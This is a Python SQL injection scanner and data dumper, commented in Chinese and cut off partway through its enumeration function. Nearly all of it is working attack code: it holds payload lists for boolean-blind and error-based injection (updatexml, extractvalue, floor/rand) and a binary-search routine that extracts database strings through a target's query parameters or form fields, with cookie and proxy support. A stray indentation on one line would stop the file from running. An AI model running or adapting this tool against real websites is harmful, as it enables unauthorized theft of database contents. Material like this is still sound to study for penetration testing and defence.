#!/usr/bin/env python3
# sqli_scan.py - 布尔盲注 + 报错注入 + dump
# 用法见文件尾: python3 sqli_scan.py -u "http://192.168.232.10/item.php?id=1" --technique BE --dbs --dump
import argparse, re, sys, time, html
import requests
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor

requests.packages.urllib3.disable_warnings()

TRUE_PAYLOADS = [
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ('" AND 1=1-- -', '" AND 1=2-- -'),
    ("' AND 1=1#", "' AND 1=2#"),
    (") AND 1=1-- -", ") AND 1=2-- -"),
    ("' OR '1'='1", "' OR '1'='2"),
]
ERROR_PAYLOADS = [
    "' AND updatexml(1,concat(0x7e,version(),0x7e),1)-- -",
    "' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
]

 HDR = {"User-Agent": "Mozilla/5.0"}

class Ctx:
    def __init__(self, args):
        self.args = args
        self.s = requests.Session()
        self.s.headers.update(HDR)
        if args.cookie:
            for kv in args.cookie.split(";"):
                if "=" in kv:
                    k, v = kv.strip().split("=", 1)
                    self.s.cookies.set(k, v)
        self.proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
        self.timeout = args.timeout

def do_req(ctx, url, data=None):
    try:
        if data is None:
            r = ctx.s.get(url, proxies=ctx.proxies, timeout=ctx.timeout, verify=False, allow_redirects=True)
        else:
            r = ctx.s.post(url, data=data, proxies=ctx.proxies, timeout=ctx.timeout, verify=False, allow_redirects=True)
        return r.text
    except Exception as e:
        return f"__ERR__{e}"

def inject_url(base_url, param, payload):
    u = urlparse(base_url)
    qs = parse_qsl(u.query, keep_blank_values=True)
    nq = [(k, payload if k == param else v) for k, v in qs]
    # param不存在则追加
    if param not in [k for k, _ in qs]:
        nq.append((param, payload))
    return urlunparse((u.scheme, u.netloc, u.path, u.params, urlencode(nq), u.fragment))

def inject_data(data_str, param, payload):
    qs = parse_qsl(data_str or "", keep_blank_values=True)
    found = False
    nq = []
    for k, v in qs:
        if k == param:
            nq.append((k, v + payload))
            found = True
        else:
            nq.append((k, v))
    if not found:
        nq.append((param, payload))
    if isinstance(data_str, str) and "=" not in (data_str or "") and param == "body":
        return payload
    return urlencode(nq)

def get_params(args):
    params = []
    if args.params:
        params = [p.strip() for p in args.params.split(",")]
    else:
        u = urlparse(args.url)
        qs = parse_qsl(u.query, keep_blank_values=True)
        params = [k for k, _ in qs]
        if args.data:
            params += [k for k, _ in parse_qsl(args.data, keep_blank_values=True)]
        if not params:
            params = ["id"]
    return params

def fetch(ctx, args, param, payload):
    if args.data is not None or args.method == "POST":
        d = inject_data(args.data or "", param, payload)
        # GET url保持原样, payload进body
        body = {k: v for k, v in parse_qsl(d, keep_blank_values=True)}
        return do_req(ctx, args.url, data=body)
    else:
        u2 = inject_url(args.url, param, payload)
        return do_req(ctx, u2)

def is_true_diff(a, b, thresh=0.05):
    if a.startswith("__ERR__") or b.startswith("__ERR__"):
        return False
    la, lb = len(a), len(b)
    if la == 0 or lb == 0:
        return la != lb
    # 长度差>5% 或 关键词差异
    if abs(la - lb) / max(la, lb) > thresh:
        return True
    # 回退: 相似度hash简单比较
    return a != b and (la != lb or True)

def test_boolean(ctx, args, param):
    base = fetch(ctx, args, param, "")
    for pt, pf in TRUE_PAYLOADS:
        rt = fetch(ctx, args, param, pt)
        rf = fetch(ctx, args, param, pf)
        # 要求 true≈base 且 true≠false
        if rt.startswith("__ERR__") or rf.startswith("__ERR__"):
            continue
        dt_true = abs(len(rt) - len(base))
        dt_false = abs(len(rt) - len(rf))
        # true接近base, false偏离
        if dt_false > max(20, dt_true + 20):
            return True, (pt, pf)
    return False, (None, None)

def test_error(ctx, args, param):
    for p in ERROR_PAYLOADS:
        r = fetch(ctx, args, param, p)
        if re.search(r"XPATH syntax error|ExtractValue|check the manual|SQL syntax|Unknown column|ODBC|ORA-|PG::Error|PSQLException", r, re.I):
            return True, p
        if re.search(r"~[^~<]{1,128}~", r):
            # updatexml回显 ~xxx~
            return True, p
    return False, None

def blind_cmp(ctx, args, param, pt_tpl, expr_gt, ascii_val=True):
    # expr_gt: 返回布尔的SQL条件, 插入到引号上下文
    # 构造: ' AND (<cond>)-- -
    # pt_tpl取自成功的TRUE_PAYLOAD前缀风格, 简化统一用 ' AND (...)-- -
    q = getattr(blind_cmp, "quote", "'")
    if '"' in pt_tpl and "'" not in pt_tpl:
        q = '"'
    payload_true = f"{q} AND ({expr_gt})-- -"
    # 为判断, 发true条件 vs 取反, 由调用方保证expr有意义; 这里只发一次, 与baseline比较
    # 简化: 与 AND 1=1 / AND 1=2 的响应长度做锚定
    if not hasattr(blind_cmp, "anchor"):
        blind_cmp.anchor = {}
    key = (param, q)
    if key not in blind_cmp.anchor:
        rt = fetch(ctx, args, param, f"{q} AND 1=1-- -")
        rf = fetch(ctx, args, param, f"{q} AND 1=2-- -")
        blind_cmp.anchor[key] = (rt, rf)
    rt_anchor, rf_anchor = blind_cmp.anchor[key]
    r = fetch(ctx, args, param, payload_true)
    # 与哪个更接近即判定
    def dist(a, b): return abs(len(a) - len(b))
    return dist(r, rt_anchor) < dist(r, rf_anchor)

def blind_extract_str(ctx, args, param, pt, expr, maxlen=64):
    # expr: 返回字符串的SQL, 如 version(), (SELECT schema_name FROM ...)
    out = ""
    for pos in range(1, maxlen + 1):
        # 先判结束: ASCII(SUBSTR((expr),pos,1))=0
        is_end = blind_cmp(ctx, args, param, pt, f"ASCII(SUBSTR(({expr}),{pos},1))=0")
        if is_end:
            break
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTR(({expr}),{pos},1))>{mid}"
            if blind_cmp(ctx, args, param, pt, cond):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo)
    return out

def error_extract_str(ctx, args, param, expr):
    # 用updatexml一次带32字节, 分段SUBSTR
    res = ""
    for off in [1, 33, 65, 97]:
        sub = f"SUBSTR(({expr}),{off},31)"
        for tpl in ["' AND updatexml(1,concat(0x7e,({e}),0x7e),1)-- -",
                    "' AND extractvalue(1,concat(0x7e,({e}),0x7e))-- -"]:
            p = tpl.format(e=sub)
            r = fetch(ctx, args, param, p)
            m = re.search(r"~([^~<]{1,256})~", html.unescape(r))
            if m and m.group(1).strip():
                res += m.group(1)
                break
        else:
            continue
        # 若本次不足31说明结束可继续探一次后停, 简化继续
    # 去重截断 artefacts
    return res

def extract(ctx, args, param, mode, expr):
    if mode == "E":
        v = error_extract_str(ctx, args, param, expr)
        if v:
            return v
    # 回退盲注
    pt = getattr(extract, "pt", "' AND 1=1-- -")
    return blind_extract_str(ctx, args, param, pt, expr)

def enum_and_dump(ctx, args, param, mode):
    out = {}
    q = lambda e: extract(ctx, args, param, mode, e)
    print(f"[+] [{param}] mode={mode} fingerprint")
    out["version"] = q("version()")
